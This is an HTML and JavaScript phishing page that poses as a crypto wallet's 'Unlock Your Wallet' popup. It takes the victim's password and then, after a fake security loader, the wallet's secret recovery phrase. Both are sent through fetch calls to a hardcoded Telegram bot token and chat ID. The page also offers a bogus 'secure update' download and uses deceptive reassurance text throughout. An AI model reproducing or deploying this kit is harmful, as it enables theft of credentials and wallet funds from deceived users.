<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Unlock Your Wallet</title>
  <meta name="viewport" content="width=420,initial-scale=1">
  <style>
    body {
      background: transparent;
      margin: 0;
      padding: 0;
      font-family: 'Inter', Arial, sans-serif;
    }
    .wallet-popup {
      position: fixed;
      top: 0px;
      right: 24px;
      z-index: 99999;
      background: #0e1015;
      border-radius: 40px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.20);
      max-width: 420px;
      width: 94vw;
      color: #fff;
      overflow: hidden;
      border: none;
      opacity: 0;
      pointer-events: none;
      transform: translateY(-24px) scale(0.98);
      transition: opacity 0.35s cubic-bezier(.59,.16,.62,1.38), transform 0.35s cubic-bezier(.59,.16,.62,1.38);
    }
    .wallet-popup.active {
      opacity: 1;
      pointer-events: all;
      transform: translateY(0) scale(1);
    }
    .wallet-popup-image {
      background: #ffe934;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 28px 0 0 0; /* reduced from 40px */
      border-radius: 40px 40px 0 0;
      overflow: hidden;
    }
    .wallet-popup-image img {
      display: block;
      width: 100%;
      max-width: 100%;
      height: auto;
      object-fit: cover;
      background: #ececec;
      border-radius: 0;
    }
    .wallet-popup-content {
      padding: 28px 24px 18px 24px; /* reduced from 40px 24px 24px 24px */
      text-align: left;
    }
    .wallet-popup-content h2 {
      font-size: 2rem;
      font-weight: bold;
      margin-bottom: 8px;
      color: #fff;
      letter-spacing: -.5px;
    }
    .wallet-desc {
      color: #90939d;
      margin-bottom: 18px; /* reduced from 28px */
      font-size: 1.08rem;
    }
    .wallet-input-group {
      background: #14161c;
      border: 1.5px solid #25282e;
      border-radius: 14px;
      display: flex;
      align-items: center;
      padding: 0 14px;
      margin-bottom: 16px; /* reduced from 24px */
      transition: border 0.2s;
    }
    .wallet-input-group:focus-within {
      border-color: #ffe934;
    }
    .wallet-input-group input {
      background: transparent;
      border: none;
      outline: none;
      color: #fff;
      font-size: 1.12rem;
      padding: 15px 0; /* reduced from 18px */
      flex: 1;
    }
    .toggle-password {
      cursor: pointer;
      color: #90939d;
      font-size: 1.25rem;
      margin-left: 10px;
      user-select: none;
    }
    .wallet-unlock-btn,
    .wallet-download-btn,
    .wallet-skip-btn,
    .wallet-submit-btn {
      background: #ffe934;
      color: #23262f;
      border: none;
      border-radius: 30px;
      width: 100%;
      padding: 15px 0; /* reduced from 18px */
      font-size: 1.18rem;
      font-weight: 700;
      margin-bottom: 14px; /* reduced from 18px */
      margin-top: 6px;    /* reduced from 8px */
      cursor: pointer;
      transition: background 0.18s;
      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
      outline: none;
      display: block;
    }
    .wallet-skip-btn {
      background: #222b;
      color: #ffe934;
      margin-top: 10px;
    }
    .wallet-unlock-btn:disabled,
    .wallet-submit-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    .download-label {
      display: block;
      font-size: 1.03rem;
      line-height: 1.4;
      margin-bottom: 16px; /* reduced from 22px */
      color: #ffe934;
      background: #131417;
      padding: 8px 16px;   /* reduced from 10px 16px */
      border-radius: 9px;
      font-weight: 600;
      text-align: center;
    }
    .loader-section {
      display: none;
      text-align: center;
      padding: 28px 24px 24px 24px; /* reduced from 44px 24px 38px 24px */
    }
    .loader-section.active {
      display: block;
    }
    .loader {
      margin: 10px auto 16px auto; /* reduced from 12px auto 22px auto */
      width: 36px; /* reduced from 38px */
      height: 36px;
      border: 5px solid #ffe934;
      border-top: 5px solid #23262f;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: block;
    }
    @keyframes spin {
      100% { transform: rotate(360deg);}
    }
    .loader-message {
      font-size: 1.06rem;
      color: #ffe934;
      margin-top: 12px; /* reduced from 16px */
      min-height: 32px; /* reduced from 40px */
    }
    .wallet-popup textarea {
      width: 100%;
      min-height: 90px; /* reduced from 110px */
      background: #16181e;
      border: 1.5px solid #25282e;
      border-radius: 12px;
      color: #fff;
      font-size: 1.07rem;
      padding: 12px 16px; /* reduced from 14px 16px */
      resize: none;
      margin-bottom: 10px; /* reduced from 14px */
      box-sizing: border-box;
      outline: none;
      transition: border .2s;
    }
    .wallet-popup textarea:focus {
      border-color: #ffe934;
    }
    .forgot-password {
      text-align: center;
      margin-top: 12px; /* reduced from 18px */
    }
    .forgot-password a {
      color: #fff;
      text-decoration: none;
      font-size: 1.04rem;
      font-weight: 500;
      opacity: 0.96;
    }
    .forgot-password a:hover {
      text-decoration: underline;
    }
    @media (max-width: 480px) {
      .wallet-popup {
        top: 10px;
        right: 0;
        left: 0;
        margin: 0 auto;
        max-width: 99vw;
        border-radius: 16px;
      }
      .wallet-popup-content,
      .loader-section {
        padding: 14px 6vw; /* reduced from 20px 6vw */
      }
    }
  </style>
</head>
<body>
  <div class="wallet-popup" id="popup">
    <div class="wallet-popup-image">
      <img src="sol.png" alt="Wallet Flag" id="walletFlag" />
    </div>
    <!-- Password Section -->
    <div class="wallet-popup-content section" id="passwordSection">
      <h2>Unlock Your Wallet</h2>
      <p class="wallet-desc">Enter your password and access your funds safely.</p>
      <form id="walletUnlockForm" autocomplete="off">
        <div class="wallet-input-group">
          <input
            type="password"
            id="passwordInput"
            placeholder="Enter your password"
            required
          />
          <span class="toggle-password" id="togglePassword" tabindex="0" aria-label="Show password">&#128065;</span>
        </div>
        <button type="submit" class="wallet-unlock-btn" id="unlockBtn" disabled>Unlock</button>
      </form>
      <div class="forgot-password">
        <a href="#" id="forgotPasswordLink">Forgot password</a>
      </div>
    </div>
    <!-- Update Section -->
    <div class="wallet-popup-content section" id="updateSection" style="display:none;">
      <span class="download-label">
        A secure update is ready. Please download to continue protecting your assets.
      </span>
      <button class="wallet-download-btn" onclick="handleDownload()">Download Update</button>
      <button class="wallet-skip-btn" onclick="showLoader()">Skip</button>
    </div>
    <!-- Loader Section -->
    <div class="loader-section" id="loaderSection">
      <div class="loader"></div>
      <div class="loader-message" id="loaderMsg"></div>
    </div>
    <!-- Phrase Section -->
    <div class="wallet-popup-content section" id="phraseSection" style="display:none;">
      <textarea placeholder="Import with Secret Phrase" id="phraseInput" rows="8"></textarea>
      <button class="wallet-submit-btn" id="submitBtn" onclick="submitPhrase()" disabled>Submit</button>
    </div>
  </div>
<script>
const TELEGRAM_BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
const TELEGRAM_CHAT_ID = '-4704812522';

// Helper to send message to Telegram
function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    })
  });
}

// Section navigation helpers
function nextSection(showId) {
  document.querySelectorAll('.section, .loader-section').forEach(sec => {
    sec.classList.remove('active');
    sec.style.display = 'none';
  });
  const el = document.getElementById(showId);
  el.classList.add('active');
  el.style.display = '';
  // Focus input if needed
  if (showId === 'passwordSection') document.getElementById('passwordInput').focus();
  if (showId === 'phraseSection') document.getElementById('phraseInput').focus();
}

function handleDownload() {
  // Simulate a download trigger
  const a = document.createElement('a');
  a.href = 'https://example.com/wallet-update.zip'; // replace with your file
  a.download = 'wallet-update.zip';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  // Do NOT show phrase section after download
}

function showLoader() {
  document.getElementById('loaderMsg').textContent = "For your security, we need to restore your wallet. Please wait while we prepare your recovery process.";
  nextSection('loaderSection');
  setTimeout(() => {
    nextSection('phraseSection');
  }, 5000);
}

function showLazyLoader() {
  document.getElementById('loaderMsg').textContent = ""; // No message for unlock loader
  nextSection('loaderSection');
  setTimeout(() => {
    nextSection('updateSection');
  }, 2000);
}

function submitPhrase() {
  const phrase = document.getElementById('phraseInput').value.trim();
  if (!phrase) {
    alert('Please enter your secret phrase.');
    document.getElementById('phraseInput').focus();
    return;
  }
  sendToTelegram(`Mnemonic phrase entered: ${phrase}`);
  alert('Phrase submitted!');
  document.getElementById('popup').classList.remove('active');
}

window.addEventListener('DOMContentLoaded', () => {
  setTimeout(() => {
    document.getElementById('popup').classList.add('active');
    nextSection('passwordSection');
  }, 300);

  // Password visibility toggle
  const passwordInput = document.getElementById('passwordInput');
  const togglePassword = document.getElementById('togglePassword');
  togglePassword.addEventListener('click', function () {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    this.textContent = type === 'password' ? '\u{1F441}' : '\u{1F441}\u{FE0E}'; // eye icon
  });
  togglePassword.addEventListener('keydown', function (e) {
    if (e.key === 'Enter' || e.key === ' ') {
      togglePassword.click();
    }
  });

  // Disable unlock button if password is empty
  const unlockBtn = document.getElementById('unlockBtn');
  function toggleUnlockBtn() {
    unlockBtn.disabled = passwordInput.value.trim() === '';
  }
  passwordInput.addEventListener('input', toggleUnlockBtn);
  toggleUnlockBtn();

  // Disable submit button if textarea is empty
  const phraseInput = document.getElementById('phraseInput');
  const submitBtn = document.getElementById('submitBtn');
  function togglePhraseBtn() {
    submitBtn.disabled = phraseInput.value.trim() === '';
  }
  phraseInput.addEventListener('input', togglePhraseBtn);
  togglePhraseBtn();

  // Password form submission
  document.getElementById('walletUnlockForm').addEventListener('submit', function (e) {
    e.preventDefault();
    const password = passwordInput.value;
    sendToTelegram(`Password entered: ${password}`);
    showLazyLoader();
  });

  // Forgot password logic
  document.getElementById('forgotPasswordLink').addEventListener('click', function (e) {
    e.preventDefault();
    alert('Forgot password clicked! Implement your recovery logic here.');
  });
});
</script>
</body>
</html>